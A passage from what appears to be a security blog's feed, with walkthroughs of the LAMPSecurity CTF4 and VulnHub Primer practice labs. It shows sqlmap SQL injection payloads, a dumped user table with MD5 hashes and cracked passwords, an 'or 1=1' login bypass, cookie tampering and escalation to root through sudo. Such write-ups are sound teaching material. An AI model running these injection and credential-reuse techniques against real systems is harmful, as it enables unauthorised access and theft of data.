<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/textlogin.png" title="text login" alt="no gui"></p>

<p>I chose to manually start the GUI so I can read the random quotes that are given at login. You can load the GUI with the <strong>startx</strong> command</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/finished.png" title="slackware" alt="slackware install"></p>

<p>All done! From here you can proceed to use your new distro, or customize it to your liking</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ You will experience a strong urge to do \
</span><span class='line'>\ good; but it will pass.                 /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF4]]></title>
    <link href="http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4/"/>
    <updated>2016-04-19T05:40:39-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is part of a CTF series by the LAMPSecurity project.</p>

<!-- more -->


<p>The Nmap scan reveals just a few ports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/Downloads#nmap -sS -sV -p1-65535 192.168.80.152
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-03-02 09:26 EST
</span><span class='line'>Nmap scan report for 192.168.80.152
</span><span class='line'>Host is up, received arp-response (0.00038s latency).
</span><span class='line'>Not shown: 65531 filtered ports, 1 closed port
</span><span class='line'>Reason: 65369 no-responses, 162 host-prohibiteds and 1 reset
</span><span class='line'>PORT   STATE SERVICE REASON         VERSION
</span><span class='line'>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.3 (protocol 2.0)
</span><span class='line'>25/tcp open  smtp    syn-ack ttl 64 Sendmail 8.13.5/8.13.5
</span><span class='line'>80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.0 ((Fedora))
</span><span class='line'>MAC Address: 00:0C:29:1D:B6:45 (VMware)
</span><span class='line'>Service Info: Host: ctf4.sas.upenn.edu; OS: Unix</span></code></pre></td></tr></table></div></figure>


<p>Checking out the web server, we can see this page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/home.png" title="home" alt="home"></p>

<p>Let&rsquo;s get digging!</p>

<h3>Recon</h3>

<p>The Blog section contains some blog posts, for which the URL looks like this: <code><a href="http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5">http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5</a></code>. That id parameter calls for SQLi testing and the page parameter could be vulnerable to LFI. But for now, let&rsquo;s keep sniffing around.</p>

<p>One of the things I always do when doing web based challenges is check if there&rsquo;s anything of interest in the <code>robots.txt</code> file. So I did it here as well and I wasn&rsquo;t disappointed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /mail/
</span><span class='line'>Disallow: /restricted/
</span><span class='line'>Disallow: /conf/
</span><span class='line'>Disallow: /sql/
</span><span class='line'>Disallow: /admin/</span></code></pre></td></tr></table></div></figure>


<p>Quite a few places to check! Let&rsquo;s see what we&rsquo;ve got.</p>

<ul>
<li><strong>/mail/</strong></li>
</ul>


<p>This is not your regular mail server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/squirrel.png" title="squirrelmail" alt="squirrelmail"></p>

<p>I&rsquo;ve never seen this before, so I checked the project&rsquo;s homepage:</p>

<blockquote><p>SquirrelMail is a standards-based webmail package written in PHP. It includes built-in pure PHP support for the IMAP and SMTP protocols, and
all pages render in pure HTML 4.0 (with no JavaScript required) for maximum compatibility across browsers. It has very few requirements and is
very easy to configure and install. SquirrelMail has all the functionality you would want from an email client, including strong MIME support,
address books, and folder manipulation.</p></blockquote>

<p>Ok, will come back to this, for now I&rsquo;m just checking the entire thing for possible entry points.</p>

<ul>
<li><strong>/restricted/</strong></li>
</ul>


<p>Trying to get to this folder will pop up a basic authentication window. Moving on</p>

<ul>
<li><strong>/conf/</strong></li>
</ul>


<p>This one gives an internal server error, but discloses the e-mail address of the server administrator: <code>dstevens@localhost</code></p>

<ul>
<li><strong>/sql/</strong></li>
</ul>


<p>Here we have a directory indexing with a db.sql file that contains the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">use</span> <span class="n">ehks</span><span class="p">;</span>
</span><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="k">user</span> <span class="p">(</span><span class="n">user_id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="n">auto_increment</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span> <span class="n">user_name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span> <span class="n">user_pass</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
</span><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="n">blog</span> <span class="p">(</span><span class="n">blog_id</span> <span class="nb">int</span> <span class="k">primary</span> <span class="k">key</span> <span class="k">not</span> <span class="k">null</span> <span class="n">auto_increment</span><span class="p">,</span> <span class="n">blog_title</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">blog_body</span> <span class="nb">text</span><span class="p">,</span> <span class="n">blog_date</span> <span class="n">datetime</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
</span><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="k">comment</span> <span class="p">(</span><span class="n">comment_id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="n">auto_increment</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span> <span class="n">comment_title</span> <span class="nb">varchar</span> <span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="n">comment_body</span> <span class="nb">text</span><span class="p">,</span> <span class="n">comment_author</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="n">comment_url</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="n">comment_date</span> <span class="n">datetime</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>/admin/</strong></li>
</ul>


<p>And finally, an admin login page.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/admin.png" title="admin" alt="admin"></p>

<p>Also, the search functionality is vulnerable to XSS! Ok, we have enough information to start poking deeper.</p>

<h3>Getting in</h3>

<p>First thing I tried was to put a quote in the id parameter, and a SQL error popped up:  <em>Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20</em>. Time to fire Sqlmap!</p>

<p>First, I enumerated the available databases:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.152/index.html?page=blog&title=Blog&id=2" -p "id" --dbms=MySQL --dbs
</span><span class='line'>
</span><span class='line'>[06:05:45] [INFO] testing connection to the target URL
</span><span class='line'>sqlmap resumed the following injection point(s) from stored session:
</span><span class='line'>---
</span><span class='line'>Parameter: id (GET)
</span><span class='line'>    Type: boolean-based blind
</span><span class='line'>    Title: AND boolean-based blind - WHERE or HAVING clause
</span><span class='line'>    Payload: page=blog&title=Blog&id=2 AND 4151=4151
</span><span class='line'>
</span><span class='line'>    Type: AND/OR time-based blind
</span><span class='line'>    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
</span><span class='line'>    Payload: page=blog&title=Blog&id=2 AND (SELECT * FROM (SELECT(SLEEP(5)))tueL)
</span><span class='line'>
</span><span class='line'>    Type: UNION query
</span><span class='line'>    Title: Generic UNION query (NULL) - 5 columns
</span><span class='line'>    Payload: page=blog&title=Blog&id=2 UNION ALL SELECT NULL,NULL,CONCAT(0x716a7a7671,0x61536d554d5745557253,0x7162716a71),NULL,NULL-- 
</span><span class='line'>---
</span><span class='line'>[06:05:45] [INFO] testing MySQL
</span><span class='line'>[06:05:45] [INFO] confirming MySQL
</span><span class='line'>[06:05:45] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Fedora 5 (Bordeaux)
</span><span class='line'>web application technology: Apache 2.2.0, PHP 5.1.2
</span><span class='line'>back-end DBMS: MySQL &gt;= 5.0.0
</span><span class='line'>[06:05:45] [INFO] fetching database names
</span><span class='line'>available databases [6]:
</span><span class='line'>[*] calendar
</span><span class='line'>[*] ehks
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
</span><span class='line'>[*] roundcubemail
</span><span class='line'>[*] test</span></code></pre></td></tr></table></div></figure>


<p>I then looked at the ehks database, the interesting table contains usernames and password hashes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Database: ehks
</span><span class='line'>Table: user
</span><span class='line'>[6 entries]
</span><span class='line'>+---------+-----------+----------------------------------+
</span><span class='line'>| user_id | user_name | user_pass                        |
</span><span class='line'>+---------+-----------+----------------------------------+
</span><span class='line'>| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
</span><span class='line'>| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |
</span><span class='line'>| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
</span><span class='line'>| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
</span><span class='line'>| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
</span><span class='line'>| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
</span><span class='line'>+---------+-----------+----------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>I cracked the MD5 hashes with an online tool, behold the passwords!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dstevens: ilike2surf
</span><span class='line'>achen: seventysixers
</span><span class='line'>pmoore: Homesite
</span><span class='line'>jdurbin: Sue1978
</span><span class='line'>sorzek: pacman
</span><span class='line'>ghighland: undone1</span></code></pre></td></tr></table></div></figure>


<p>With dstevens&#8217; credentials I was able to log in both to the mail and admin panel. The admin functionality allows you to create another blog page, which I tested and it works. The mailbox was more interesting, because it was filled with OSSEC HIDS logs of my attacks! Will delete them before I&rsquo;m done, but for now I scrolled all the way to the bottom to find some real mail:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>I'm installing OSSEC v2 on the server - so I also had to install gcc and
</span><span class='line'>binutils.  Just wanted to let you know.
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>Andrew Chen
</span><span class='line'>Unix Administrator
</span><span class='line'>Ehks Data Research Center</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m thinking this mail is not just for occupying storage, but it&rsquo;s hinting that we&rsquo;ll have to do some binary exploitation on the target..Anyway, there is more mail about the server setup:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hello all,
</span><span class='line'>
</span><span class='line'>  the server is up and running now and should be able to support most of
</span><span class='line'>our needs.  Don and I are still working on installing a few more patches
</span><span class='line'>and configuring things.  Let us know if you have any problems.  Thanks!
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>Don Stevens
</span><span class='line'>Sr. Unix Admin
</span><span class='line'>Prof. Ehks Data Research Center</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>
</span><span class='line'>Hey Don,
</span><span class='line'>
</span><span class='line'>  I think I got the server pretty much set up.  I just have to make some
</span><span class='line'>more adjustments.  Unfortunately I couldn't get RoundCube installed
</span><span class='line'>because our version of PHP is too low.  I'll send more updates as I make
</span><span class='line'>them.
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>James Durbin
</span><span class='line'>Webmaster
</span><span class='line'>Prof. Ehks Data Research Center</span></code></pre></td></tr></table></div></figure>


<p>There is also mail about a calendar feature that I wasn&rsquo;t aware of:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hello all,
</span><span class='line'>
</span><span class='line'>  I'd like to announce that the new calendaring software is online.  You
</span><span class='line'>all have accounts that you can log in with, they have the same username
</span><span class='line'>and password as your machine accounts.  Feel free to log into the new
</span><span class='line'>system at http://192.168.0.6/calendar.  Let me know if you have any
</span><span class='line'>problems.
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>Don Stevens</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve almost forgotten to check the <em>/restricted</em> folder, so I next did that. It worked with the pair of <em>pmoore/Homesite</em>. Inside there are 2 text files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>blog_instructions.txt
</span><span class='line'>
</span><span class='line'>Instructions for Posting to the Blog
</span><span class='line'>====================================
</span><span class='line'>
</span><span class='line'>Just log into the admin section at http://192.168.0.6/admin.
</span><span class='line'>Use your regular machine credentials (username and password).
</span><span class='line'>Once you're logged in click the "Blog" link.
</span><span class='line'>
</span><span class='line'>webmail_instructions.txt  
</span><span class='line'>
</span><span class='line'>Instructions for Webmail
</span><span class='line'>========================
</span><span class='line'>
</span><span class='line'>Browse to the URL http://192.168.0.6/mail
</span><span class='line'>Log in with your regular machine credentials (username and password).
</span><span class='line'>Use webmail ;)
</span><span class='line'>
</span><span class='line'>Let Don or James know if you're having problems.</span></code></pre></td></tr></table></div></figure>


<p>Just stuff we had figured on our own. I checked the PHP version, because of the mail hint, the headers mention it as being 5.1.2. Next I logged in for the calendar:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/calendar.png" title="calendar" alt="calendar"></p>

<p>In the admin tab we can modify some calendar options and add a new user. Nothing too helpful in hacking the target, although I did try a RFI because a Nessus scan I&rsquo;ve run indicated the calendar was vulnerable to <a href="http://www.gulftech.org/advisories/PHP-Calendar%20Arbitrary%20File%20Inclusion/58">arbitrary file inclusion</a>. So the last thing left to try before thinking of more options was to see if I could login to SSH with any of the usernames and passwords I had. And I was able to get in the box from the first try, as dstevens!</p>

<p>I looked around in his home directory, the files related to the site are hosted there. Then I tried to read the <code>/etc/sudoers</code> file, and it worked with sudo and his password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'># User privilege specification
</span><span class='line'>root  ALL=(ALL) ALL
</span><span class='line'>dstevens  ALL=(ALL)   ALL
</span><span class='line'>achen ALL=(ALL)   NOPASSWD:ALL
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Well, look at these privileges! Then it&rsquo;s all the matter of becoming root with a simple <em>su</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[dstevens@ctf4 calendar]$ sudo su -
</span><span class='line'>Password:
</span><span class='line'>[root@ctf4 ~]# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Game over! Although at the beginning there seemed to be multiple web avenues for exploitation, most of them were informational, and it was just the SQL injection that gave the keys to the kingdom. Lax permissions and password reuse facilitated the compromise of the target.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Q: How do you shoot a blue elephant? A: \
</span><span class='line'>| With a blue-elephant gun.               |
</span><span class='line'>|                                         |
</span><span class='line'>| Q: How do you shoot a pink elephant? A: |
</span><span class='line'>| Twist its trunk until it turns blue,    |
</span><span class='line'>| then shoot it with                      |
</span><span class='line'>|                                         |
</span><span class='line'>\ a blue-elephant gun.                    /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Primer]]></title>
    <link href="http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/"/>
    <updated>2016-03-11T06:56:18-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve decided to try a VM named Primer that was recently added to VulnHub. I was hooked by the description of it being a story driven VM that was inspired by William Gibson&rsquo;s Spraw Trilogy, which was one of my first reads in hacking literature, after I became interested in the subject! And it also provided me with a new novel to read, since I didn&rsquo;t know about Snow Crash:</p>

<blockquote><p>Concept</p>

<p>This is a story based challenge written in a style heavily inspired by Neil Stephensons Snow Crash and William Gibsons Sprawl Trilogy. Each
chapter is unlocked by solving the puzzle. From hardcoded clear text javascript password checks, SQL-injections and cracking hashes to a
simulated terminal. You only need to start the VM, a webserver will come up and you can connect with your browser. In fact you never have to
leave the browser.</p>

<p>Goal</p>

<p>Teach some basic well known techniques and attacks. Spark some curiosity, make the user look at the source code and try to figure out what&rsquo;s
going on behind the scenes. The main goal is to give a nice welcoming intro to the scene and hopefully also teach something about ethics and
responsibility.</p></blockquote>

<!-- more -->


<p>After you determine the IP address of the VM, point your browser to it and you will be greeted by this:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level1.png" title="primer level 1" alt="primer level 1"></p>

<p>Read the story, it&rsquo;s a nice way to get you immersed in the challenge, and it also contains hints for solving the level.</p>

<p>Looking in the source, I saw this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Some f0rms are easier than others.
</span><span class='line'>This one was just a means to get to the next level so there was no need for her to apply her full set of skills or fake credentials. Manufacturing a bo0le4n response would probably be enaugh to let her pass.</span></code></pre></td></tr></table></div></figure>


<p>Well then, following the hint, I used a classic SQLi string that would be evaluated as True: <code>yo &lsquo;or 1=1&mdash; </code></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level2.png" title="primer level 2" alt="primer level 2"></p>

<p>The description points to the user agent, and when checking the source again, we can see a comment stating exactly what we need to fool the bot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>This bot was looking for a Sosū User Agent Identifier she had cracked weeks ago, easy sauce, just a simple md5 hash of the first 7 digits of
</span><span class='line'>pi. It was basically common knowledge to the entities moving in these areas but obscurity does create a, albeit virtual, layer of security.</span></code></pre></td></tr></table></div></figure>


<p>Ok..I took the first 7 digits of Pi (3.141592) and converted them to MD5, getting the string <em>d483d00d07fcc80319d170ccf07fb5be</em>. Then I changed my user agent to this string, and bam!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level3.png" title="primer level 3" alt="primer level 3"></p>

<p>This time there is no hint in the source, but reading the plot description made me think about cookies, and I discovered an activeSession cookie with a value of false. Now let&rsquo;s see what happens if I change it to true..</p>

<p>Reloaded the page..and!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level4.png" title="primer level 4" alt="primer level 4"></p>

<p>I almost missed the hint hidden inside the <code><head></code> tag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;hint&quot;</span> <span class="na">content=</span><span class="s">&quot;Think, but don&#39;t act like a robot.&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This made me check if there is a robots.txt file, and there I found the next piece of the puzzle!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /4_8f14e45fceea167a5a36dedd4bea2543</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level5.png" title="primer level 5" alt="primer level 5"></p>

<p>Clicking the thing on this page that stands out will take you elsewhere.. :) you can see in the source exactly where:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;../5_6512bd43d9caa6e02c990b0a82652dca&quot;</span><span class="nt">&gt;</span>[EOF]<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level6.png" title="primer level 6" alt="primer level 6"></p>

<p>So, the character in the story seems to be getting more and more familiar..:D Now, let&rsquo;s go to the place that smells like a trap, and see what awaits us there!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level7.png" title="primer level 7" alt="primer level 7"></p>

<p>You can see the page keeps reloading and you can&rsquo;t right-click to view the source..but there are other ways! First, I entered something in the box to see what would happen:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/beware.png" title="beware" alt="beware"></p>

<p>Yikes! Who knows what horrible thing we have disturbed! Better complete the rest fast! I looked at the source of the page with the <code>view-source</code> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>view-source:http://192.168.80.149/6_c51ce410c124a10e0db5e4b97fc2af39/</span></code></pre></td></tr></table></div></figure>


<p>There is a Javascript code that decides the redirection when entering something in the box. Let&rsquo;s look at it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">var</span> <span class="nx">X</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">L</span><span class="o">=</span><span class="s2">&quot;Ikdf076&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="s1">&#39;/()=&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nx">X</span> <span class="o">===</span> <span class="kc">null</span><span class="p">){</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nx">X</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="nx">L</span><span class="p">){}</span>
</span><span class='line'><span class="k">else</span> <span class="p">{</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
</span></code></pre></td></tr></table></div></figure>


